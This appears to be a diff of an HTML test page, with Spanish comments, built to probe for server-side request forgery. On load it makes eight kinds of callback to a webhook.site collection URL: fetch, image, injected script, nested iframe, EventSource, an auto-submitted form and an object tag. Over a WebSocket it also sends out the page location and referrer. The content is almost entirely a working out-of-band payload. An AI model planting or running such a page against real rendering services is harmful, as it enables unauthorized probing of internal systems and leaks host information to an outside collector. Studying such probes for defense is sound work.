@@ -1,47 +1,71 @@
 <html>
 <head>
-  <title>SSRF Webhook Test</title>
+  <title>SSRF Webhook Test v2</title>
 </head>
 <body>
   <script>
   window.onload = function() {
-    // Reemplaza 'TU_URL_DE_WEBHOOK' con la URL que obtuviste de webhook.site
     const webhookUrl = 'https://webhook.site/7cdc61db-d2f3-4e50-aab4-9744f57a2a32';
     
-    // Intenta hacer una solicitud GET al webhook
-    fetch(webhookUrl + '?source=iframe_test')
-      .then(response => response.text())
-      .then(data => console.log('Respuesta del webhook:', data))
-      .catch(error => console.error('Error:', error));
-    
-    // También podemos intentar con XMLHttpRequest para mayor compatibilidad
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', webhookUrl + '?source=xhr_test', true);
-    xhr.onload = function() {
-      console.log('XHR respuesta:', xhr.responseText);
-    };
-    xhr.onerror = function() {
-      console.error('XHR error');
-    };
-    xhr.send();
-    
-    // Intento de conexión WebSocket (aunque webhook.site no soporta WebSocket directamente)
+    // Intento 1: Fetch con modo no-cors
+    fetch(webhookUrl + '?source=fetch_nocors', {
+      mode: 'no-cors',
+      method: 'GET',
+      credentials: 'omit'
+    }).catch(error => console.error('Fetch error:', error));
+
+    // Intento 2: WebSocket seguro
     try {
-      const ws = new WebSocket('ws://echo.websocket.org');
+      const ws = new WebSocket('wss://echo.websocket.org');
       ws.onopen = () => {
-        console.log('WebSocket conectado');
-        ws.send('Mensaje desde iframe potencialmente vulnerable');
+        ws.send(JSON.stringify({
+          source: 'websocket_secure',
+          location: window.location.href,
+          referrer: document.referrer
+        }));
       };
-      ws.onmessage = (event) => {
-        console.log('WebSocket mensaje recibido:', event.data);
-        // Envía el mensaje recibido al webhook
-        fetch(webhookUrl + '?source=websocket&message=' + encodeURIComponent(event.data));
-      };
-      ws.onerror = (error) => console.error('WebSocket error:', error);
     } catch(e) {
-      console.error(e);
+      console.error('WebSocket error:', e);
     }
+
+    // Intento 3: Usando Image
+    const img = new Image();
+    img.src = webhookUrl + '?source=img_tag&time=' + Date.now();
+    
+    // Intento 4: Dynamic Script Injection
+    const script = document.createElement('script');
+    script.src = webhookUrl + '?source=script_tag&time=' + Date.now();
+    document.body.appendChild(script);
+
+    // Intento 5: Using iframe dentro de otro iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = webhookUrl + '?source=iframe_nested&time=' + Date.now();
+    document.body.appendChild(iframe);
+
+    // Intento 6: EventSource
+    try {
+      const evtSource = new EventSource(webhookUrl + '?source=eventsource');
+      evtSource.onmessage = function(e) {
+        console.log('EventSource message:', e.data);
+      };
+    } catch(e) {
+      console.error('EventSource error:', e);
+    }
+
+    // Intento 7: Usando form post
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = webhookUrl;
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'source';
+    input.value = 'form_post';
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
   }
   </script>
+  <!-- Intento 8: Using object tag -->
+  <object data="${webhookUrl}?source=object_tag" type="text/html"></object>
 </body>
 </html>
